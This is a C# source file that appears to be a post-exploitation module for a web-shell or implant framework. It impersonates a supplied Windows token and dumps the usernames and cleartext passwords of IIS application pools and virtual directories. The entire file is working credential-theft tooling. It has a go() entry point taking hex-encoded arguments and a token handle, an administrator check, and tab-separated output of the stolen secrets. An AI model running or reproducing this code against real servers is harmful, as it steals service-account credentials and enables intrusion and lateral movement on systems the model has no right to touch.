using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using Microsoft.Web.Administration;


public class Module_dump_iis_secrets
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";
    public const string SEPARATOR       = "\t";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            int errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    private bool IsHighIntegrity()
    {
        bool flag = false;
        using(WindowsIdentity identity = WindowsIdentity.GetCurrent())
        {
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            flag = principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        return flag;
    }

    private string[] doDumpIISSecrets()
    {
        string result = "";
        result       += "Type" + SEPARATOR;
        result       += "Runtime" + SEPARATOR;
        result       += "ApplicationPoolName" + SEPARATOR;
        result       += "VirtualDirectoryName" + SEPARATOR;
        result       += "UserName" + SEPARATOR;
        result       += "Password" + Environment.NewLine;

        try
        {
            if (!IsHighIntegrity())
                return new string[]{ERR_CODE, "No High Integrity detected in current context" + Environment.NewLine};
            
            ServerManager server = new Microsoft.Web.Administration.ServerManager();
            ApplicationPoolCollection applicationPools = server.ApplicationPools;
            foreach (ApplicationPool pool in applicationPools)
            {
                bool autoStart = pool.AutoStart;
                string runtime = (pool.ManagedRuntimeVersion != "") ? pool.ManagedRuntimeVersion : "-";
                string appPoolName = (pool.Name != "") ? pool.Name : "-";
                ProcessModelIdentityType identityType = pool.ProcessModel.IdentityType;
                string username = (pool.ProcessModel.UserName != "") ? pool.ProcessModel.UserName : "-";
                string password = (pool.ProcessModel.Password != "") ? pool.ProcessModel.Password : "-";
                
                result += "ApplicationPool" + SEPARATOR;
                result += runtime + SEPARATOR;
                result += appPoolName + SEPARATOR;
                result += "-" + SEPARATOR;
                result += username + SEPARATOR;
                result += password + Environment.NewLine;
            }

            SiteCollection serverSites = server.Sites;
            foreach (Site serverSite in serverSites)
            {
                ApplicationCollection siteApplications = serverSite.Applications;
                foreach (Application siteApplication in siteApplications)
                {
                    string appPoolName = (siteApplication.ApplicationPoolName != "") ? siteApplication.ApplicationPoolName : "-";
                    VirtualDirectoryCollection appVirtualDirs = siteApplication.VirtualDirectories;
                    foreach (VirtualDirectory appVirtualDir in appVirtualDirs)
                    {
                        string appVirtualDirName = (appVirtualDir.ToString() != "") ? appVirtualDir.ToString() : "-";
                        string username          = (appVirtualDir.UserName != "") ? appVirtualDir.UserName : "-";
                        string password          = (appVirtualDir.Password != "") ? appVirtualDir.Password : "-";

                        result += "VirtualDirectory" + SEPARATOR;
                        result += "-" + SEPARATOR;
                        result += appPoolName + SEPARATOR;
                        result += appVirtualDirName + SEPARATOR;
                        result += username + SEPARATOR;
                        result += password + Environment.NewLine;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        return doDumpIISSecrets();
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_dump_iis_secrets m = new Module_dump_iis_secrets();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}
